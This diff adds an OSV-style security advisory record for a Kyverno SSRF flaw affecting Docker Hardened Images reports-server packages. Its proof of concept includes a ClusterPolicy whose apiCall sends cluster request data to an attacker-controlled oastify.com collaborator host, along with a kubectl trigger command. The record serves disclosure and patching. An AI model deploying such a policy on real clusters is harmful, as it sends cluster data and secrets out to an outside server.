@@ -1,0 +1,141 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-7lo6-rtf7-4pdi-jwgp",
+  "modified": "2026-11-11T15:50:08Z",
+  "published": "2026-11-11T15:50:08Z",
+  "upstream": [
+    "GHSA-459x-q9hg-4gpq"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\nAn attacker with the ability to create Kyverno policies in a Kubernetes cluster can use Service Call functionality to perform SSRF to a server under their control in order to exfiltrate data.\n\n### Details\nAccording to the documentation, Service Call is intended to address services located inside the Kubernetes cluster, but this method can also resolve external addresses, which allows making requests outside the Kubernetes cluster.\n\nhttps://kyverno.io/docs/writing-policies/external-data-sources/#variables-from-service-calls\n\n### PoC\nCreate a slightly modified Cluster Policy from the documentation. In the url we specify the address of a server controlled by the attacker, for example Burp Collaborator.\n```yaml\napiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: check-namespaces      \nspec:\n  rules:\n  - name: call-extension\n    match:\n      any:\n      - resources:\n          kinds:\n          - ConfigMap\n    context:\n    - name: result\n      apiCall:\n        method: POST\n        data:\n        - key: namespace\n          value: \"{{request.namespace}}\"\n        service:\n          url: http://bo3gyn4qwyjnrx87fjnrsd4p7gd71xpm.oastify.com/payload          \n    validate:\n      message: \"namespace {{request.namespace}} is not allowed\"\n      deny:\n        conditions:\n          all:\n          - key: \"{{ result.allowed }}\"\n            operator: Equals\n            value: false\n```\nNow let's create some configmap:\n```bash\nkubectl create configmap special-config --from-literal=special.how=very --from-literal=special.type=charm\n```\nLook at the Burp Collaborator logs:\n<img width=\"723\" alt=\"Снимок экрана 2025-02-21 в 17 31 25\" src=\"https://github.com/user-attachments/assets/9445a71a-6687-430a-8476-3fd546bc2bf2\" />\n\n\n### Impact\nAn attacker creating such a policy can obtain the contents of all Kubernetes resources created in the cluster, including secrets containing sensitive information.",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "reports-server-dev",
+        "purl": "pkg:apk/dhi/reports-server-dev"
+      },
+      "versions": [
+        "0.1.7-r0",
+        "0.1.7-r1",
+        "0.1.7-r10",
+        "0.1.7-r11",
+        "0.1.7-r12",
+        "0.1.7-r13",
+        "0.1.7-r14",
+        "0.1.7-r15",
+        "0.1.7-r16",
+        "0.1.7-r17",
+        "0.1.7-r2",
+        "0.1.7-r3",
+        "0.1.7-r4",
+        "0.1.7-r8"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "reports-server-fips-dev",
+        "purl": "pkg:apk/dhi/reports-server-fips-dev"
+      },
+      "versions": [
+        "0.1.7-r0",
+        "0.1.7-r1",
+        "0.1.7-r10",
+        "0.1.7-r11",
+        "0.1.7-r12",
+        "0.1.7-r13",
+        "0.1.7-r14",
+        "0.1.7-r15",
+        "0.1.7-r16",
+        "0.1.7-r17",
+        "0.1.7-r2",
+        "0.1.7-r3",
+        "0.1.7-r4",
+        "0.1.7-r8"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "reports-server-fips",
+        "purl": "pkg:apk/dhi/reports-server-fips"
+      },
+      "versions": [
+        "0.1.7-r0",
+        "0.1.7-r1",
+        "0.1.7-r10",
+        "0.1.7-r11",
+        "0.1.7-r12",
+        "0.1.7-r13",
+        "0.1.7-r14",
+        "0.1.7-r15",
+        "0.1.7-r16",
+        "0.1.7-r17",
+        "0.1.7-r2",
+        "0.1.7-r3",
+        "0.1.7-r4",
+        "0.1.7-r8"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "reports-server",
+        "purl": "pkg:apk/dhi/reports-server"
+      },
+      "versions": [
+        "0.1.7-r0",
+        "0.1.7-r1",
+        "0.1.7-r10",
+        "0.1.7-r11",
+        "0.1.7-r12",
+        "0.1.7-r13",
+        "0.1.7-r14",
+        "0.1.7-r15",
+        "0.1.7-r16",
+        "0.1.7-r17",
+        "0.1.7-r2",
+        "0.1.7-r3",
+        "0.1.7-r4",
+        "0.1.7-r8"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-7lo6-rtf7-4pdi-jwgp"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-459x-q9hg-4gpq"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/kyverno/kyverno/security/advisories/GHSA-459x-q9hg-4gpq"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://pkg.go.dev/vuln/GO-2025-3615"
+    }
+  ]
+}
